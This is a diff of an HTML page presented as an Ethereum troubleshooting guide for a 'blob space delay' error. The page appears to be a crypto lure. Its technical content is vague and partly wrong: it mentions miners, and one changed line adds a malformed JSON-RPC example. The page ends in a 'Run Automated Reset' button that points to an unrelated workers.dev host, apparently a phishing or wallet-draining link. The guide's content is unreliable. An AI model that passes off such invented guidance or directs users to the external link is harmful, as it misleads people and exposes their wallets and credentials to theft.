@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #121214;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,32 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an "Ethereum blob space delay".</li>
+<li>Users experience delayed blob space allocation on the Ethereum network, resulting in slower than expected transaction processing times and potential timeouts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's blob space being overwhelmed, causing a backlog of transactions waiting to be processed. This can happen when there is a high volume of transactions being sent, exceeding the network's capacity to handle them.</li>
+<li>The Ethereum blob space delay occurs due to high network congestion and insufficient gas prices, leading to a backlog of pending transactions and slow allocation of blob space.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '0x...', gas: '0x...'})</code></li>
-<li>Use a higher gas price to incentivize miners: </li>
+<li>Increase the gas price to prioritize transaction processing: </li>
+<li>Set a higher gas price using the <code>eth_sendTransaction</code> method</li>
+<li>Utilize a gas price oracle to determine the optimal gas price</li>
+<li>Implement a retry mechanism with exponential backoff to handle failed transactions</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;[]}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<ul>
-<li>Split large transactions into smaller ones to reduce the load on the network</li>
-</ul>
-<p>For more advanced troubleshooting, consider using an external console to gain more insights into the network's current state.</p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node or wallet software installed</li>
-<li>Basic understanding of Ethereum transaction mechanics</li>
-<li>Familiarity with command-line interfaces or JSON-RPC APIs</li>
+<li>Ethereum node synchronization with the latest blockchain data</li>
+<li>Sufficient ETH balance for transaction fees</li>
+<li>Compatible Web3 provider or library (e.g. Web3.js or Ethers.js)</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
